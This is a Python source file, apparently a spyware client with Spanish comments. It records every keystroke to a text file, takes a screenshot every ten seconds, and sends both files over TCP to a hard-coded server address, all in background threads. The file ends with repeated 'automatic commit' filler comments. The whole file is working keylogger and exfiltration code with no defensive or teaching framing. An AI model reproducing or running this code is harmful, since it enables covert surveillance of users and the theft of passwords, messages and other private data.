# cliente.py
import socket
import time
import threading
import os
from PIL import ImageGrab
from pynput import keyboard

SERVIDOR_IP = '192.168.30.44'  # Cambia por la IP de tu servidor
SERVIDOR_PUERTO = 5000

ARCHIVO_TECLAS = "teclas.txt"

# Enviar archivo al servidor
def enviar_archivo(ruta_archivo):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVIDOR_IP, SERVIDOR_PUERTO))
            nombre = ruta_archivo.split("/")[-1]
            tamaño = str(os.path.getsize(ruta_archivo))

            s.send(nombre.encode())
            time.sleep(0.1)
            s.send(tamaño.encode())
            time.sleep(0.1)

            with open(ruta_archivo, 'rb') as f:
                s.sendfile(f)
        print(f"[Cliente] Archivo {nombre} enviado.")
    except Exception as e:
        print(f"[Error al enviar archivo] {e}")

# Registrar teclas
def registrar_teclas():
    def on_press(key):
        with open(ARCHIVO_TECLAS, 'a') as f:
            f.write(f"{key}\n")  # Guardar cada tecla en una nueva línea

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# Captura de pantalla cada 10 segundos
def capturar_y_enviar():
    while True:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        imagen = ImageGrab.grab()
        nombre = f"screenshot_{timestamp}.png"
        imagen.save(nombre)
        enviar_archivo(nombre)
        time.sleep(10)  # Reducido de 60 a 10 segundos

# Enviar archivo de teclas cada 10 segundos
def enviar_teclas():
    while True:
        if os.path.exists(ARCHIVO_TECLAS):
            enviar_archivo(ARCHIVO_TECLAS)
        time.sleep(10)  # Reducido de 60 a 10 segundos

if __name__ == "__main__":
    threading.Thread(target=registrar_teclas, daemon=True).start()
    threading.Thread(target=capturar_y_enviar, daemon=True).start()
    threading.Thread(target=enviar_teclas, daemon=True).start()

    while True:
        time.sleep(10)
# Commit automático del día 1
# Commit automático del día 1
# Commit automático del día 1
# Commit automático del día 1
# Commit automático del día 1
# Commit automático del día 1
